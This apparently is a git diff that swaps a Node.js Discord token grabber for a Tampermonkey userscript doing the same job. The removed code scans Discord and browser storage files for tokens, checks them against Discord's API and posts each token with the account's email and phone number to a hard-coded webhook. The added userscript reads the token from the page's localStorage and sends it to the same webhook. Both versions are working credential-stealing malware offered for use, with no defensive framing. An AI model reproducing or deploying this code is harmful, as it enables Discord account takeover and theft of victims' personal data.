@@ -1,131 +1,138 @@
-const fs = require('fs')
-const axios = require('axios')
-const fetch = require('node-fetch')
+// ==UserScript==
+// @name         Get Discord Token to a discord webhook.
+// @namespace    http://tampermonkey.net/
+// @version      1.0
+// @description  Allows you to retrieve discord token on a discord webhook.
+// @author       0xyg3n
+// @match        https://discordapp.com/activ*
+// @match        https://discordapp.com/channel*
+// @match        https://discord.com/activ*
+// @match        https://discord.com/channel*
+// @grant        none
+// @run-at       document-start
+// ==/UserScript==
 
-var webhook = "https://discord.com/api/webhooks/1247364290084606052/CnNsZ184abYfD1kj3yAtkOH873RS4c7HVpD5Ryps2wX5Sv4pG-zz9KCRZmPYHIff3llm"
+//special thanks to iHavoc101#6156
 
-var paths = [
-    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,
-    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
-    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
-    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
-    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
-    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
-]
-
-for (i = 0; i < paths.length; i++) {
-    get_token(paths[i])
-}
-
-async function get_token(path) {
-    try {
-        fs.readdir(path, (err, files) => {
-            if (files === undefined) {
-                return
-            }
-
-            var filtro = files.filter(f => f.split('.').pop() === "ldb")
-            for (i = 0; i < filtro.length; i++) {
-                fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function (err, data) {
-                    let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
-                    let regex2 = /"mfa\.[\d\w_-]{84}"/;
-
-                    let [match] = regex1.exec(data) || regex2.exec(data) || [null];
-                    if (match != null) {
-                        match = match.replace(/"/g, '')
-                        console.log(match);
-                        await fetch(`https://discord.com/api/v6/users/@me`, {
-                            headers: {
-                                "authorization": match
-                            }
-                        }).then(resp => resp.json()).then(response => {
-                            if (response.id) {
-								if(!response.premium_type) {
-                                    nitro = "Sem nitro"
-                                } else {
-                                    if(response.premium_type === 1) { nitro = "Nitro Classic"}
-                                    if(response.premium_type === 2) { nitro = "Nitro Gaming"}
-                                }
-                                send(match, response.id, response.username, response.discriminator, response.email, response.phone, nitro, response.avatar)
-                            }
-                        })
-                    }
-                })
-            }
-        })
-
-        fs.readdir(path, (err, files) => {
-            if (files === undefined) {
-                return
-            }
-            var filtro = files.filter(f => f.split('.').pop() === "log")
-            for (i = 0; i < filtro.length; i++) {
-                fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function (err, data) {
-                    let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
-                    let regex2 = /"mfa\.[\d\w_-]{84}"/;
-
-                    if (regex1.test(data)) {
-
-                    }
-                    let [match] = regex1.exec(data) || regex2.exec(data) || [null];
-                    if (match != null) {
-                        match = match.replace(/"/g, '')
-						console.log(match)
-                        await fetch(`https://discord.com/api/v6/users/@me`, {
-                            headers: {
-                                "authorization": match
-                            }
-                        }).then(resp => resp.json()).then(response => {
-                            if (response.id) {
-								if(!response.premium_type) {
-                                    nitro = "Sem nitro"
-                                } else {
-                                    if(response.premium_type === 1) { nitro = "Nitro Classic"}
-                                    if(response.premium_type === 2) { nitro = "Nitro Gaming"}
-                                }
-                                send(match, response.id, response.username, response.discriminator, response.email, response.phone, nitro)
-                            }
-                        })
-                    }
-                })
-            }
-        })
-
-
-    } catch (err) {
-        console.log(err)
+(function () {
+    'use strict';
+ 
+    // implement localstorage behavior using cookie
+    //---------------------------------------------
+    if(!window.localStorage) {
+       Object.defineProperty(window, "localStorage", new(function () {
+          var aKeys = [],
+             oStorage = {};
+          Object.defineProperty(oStorage, "getItem", {
+             value: function (sKey) {
+                return this[sKey] ? this[sKey] : null;
+             },
+             writable: false,
+             configurable: false,
+             enumerable: false
+          });
+          Object.defineProperty(oStorage, "key", {
+             value: function (nKeyId) {
+                return aKeys[nKeyId];
+             },
+             writable: false,
+             configurable: false,
+             enumerable: false
+          });
+          Object.defineProperty(oStorage, "setItem", {
+             value: function (sKey, sValue) {
+                if(!sKey) {
+                   return;
+                }
+                document.cookie = escape(sKey) + "=" + escape(sValue) + "; expires=Tue, 19 Jan 2038 03:14:07 GMT; path=/";
+             },
+             writable: false,
+             configurable: false,
+             enumerable: false
+          });
+          Object.defineProperty(oStorage, "length", {
+             get: function () {
+                return aKeys.length;
+             },
+             configurable: false,
+             enumerable: false
+          });
+          Object.defineProperty(oStorage, "removeItem", {
+             value: function (sKey) {
+                if(!sKey) {
+                   return;
+                }
+                document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
+             },
+             writable: false,
+             configurable: false,
+             enumerable: false
+          });
+          Object.defineProperty(oStorage, "clear", {
+             value: function () {
+                if(!aKeys.length) {
+                   return;
+                }
+                for(var sKey in aKeys) {
+                   document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
+                }
+             },
+             writable: false,
+             configurable: false,
+             enumerable: false
+          });
+          this.get = function () {
+             var iThisIndx;
+             for(var sKey in oStorage) {
+                iThisIndx = aKeys.indexOf(sKey);
+                if(iThisIndx === -1) {
+                   oStorage.setItem(sKey, oStorage[sKey]);
+                } else {
+                   aKeys.splice(iThisIndx, 1);
+                }
+                delete oStorage[sKey];
+             }
+             for(aKeys; aKeys.length > 0; aKeys.splice(0, 1)) {
+                oStorage.removeItem(aKeys[0]);
+             }
+             for(var aCouple, iKey, nIdx = 0, aCouples = document.cookie.split(/\s*;\s*/); nIdx < aCouples.length; nIdx++) {
+                aCouple = aCouples[nIdx].split(/\s*=\s*/);
+                if(aCouple.length > 1) {
+                   oStorage[iKey = unescape(aCouple[0])] = unescape(aCouple[1]);
+                   aKeys.push(iKey);
+                }
+             }
+             return oStorage;
+          };
+          this.configurable = false;
+          this.enumerable = true;
+       })());
     }
-}
+    //---------------------------------------------------
+    
+    function dmdisc(message) {
+        let webhookurl = "https://discord.com/api/webhooks/1247364290084606052/CnNsZ184abYfD1kj3yAtkOH873RS4c7HVpD5Ryps2wX5Sv4pG-zz9KCRZmPYHIff3llm"; //put your webhook url here.
+        let request = new XMLHttpRequest();
+        request.open("POST", webhookurl);
 
-function send(token, id, username, tag, email, phone, nitro, avatar) {
-    if (email === null) {
-        email = "Sem email"
+        request.setRequestHeader('Content-type', 'application/json');
+
+        let params = {
+        username: ".:Discord Token Grabber 1.0:.",
+        avatar_url: "https://media.discordapp.net/attachments/1239347707546439774/1252148034498990122/2024-06-04_055910.png?ex=6671d1fb&is=6670807b&hm=98057ac88d81eea1813fc7e2f9fb9926443d0a2eec23cc1a9c63762e2ecafc72&=&format=webp&quality=lossless",
+        content: '**We got someone, Wake up!\nToken: '+message+'**'
+        }
+
+        request.send(JSON.stringify(params));
     }
-    if (phone === null) {
-        phone = "Sem telefone"
-    }
-    if(avatar === null) {
-        avatar = "https://cdn.discordapp.com/attachments/712856393245392897/743945577238364160/discord.jpg"
-    } else {
-        avatar = `https://cdn.discordapp.com/avatars/${id}/${avatar}.png`
-    }
-    axios.post(webhook, {
-        "embeds": [
-            {
-                "color": 1127128,
-                "author": {
-                    "name": `${username}`,
-                    "icon_url": `${avatar}`
-                },
-                "thumbnail": {
-                    "url": `${avatar}`
-                },
-                "description": `**TOKEN**\n\n${token}\n\n**ID**\n\n${id}\n\n**USERNAME**\n\n${username}#${tag}\n\n**EMAIL**\n\n${email}\n\n**PHONE**\n\n${phone}\n\n**NITRO**\n\n${nitro}`,
-            }
-        ], "username": "Token Grabber", "avatar_url": "https://images-ext-2.discordapp.net/external/B4oFamfEYyF5a2IZk_Ef3RnDA9VHiY4orjoKp_LBZ00/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/621402634821042196/a0b719d919e2176f9603f3c3e84ad801.png?width=90&height=90"
-    }, {
-        headers: {
-            'Content-Type': 'application/json',
-        },
-    })
-}
+
+    var userToken = localStorage.getItem('token');
+ 
+    document.addEventListener('readystatechange', event => {
+       if(event.target.readyState === "interactive") {} else if(event.target.readyState === "complete") {
+          setTimeout(function () {
+             setTimeout(function () {dmdisc(userToken);},1000); 
+          }, 3000);
+       }
+    });
+ })();
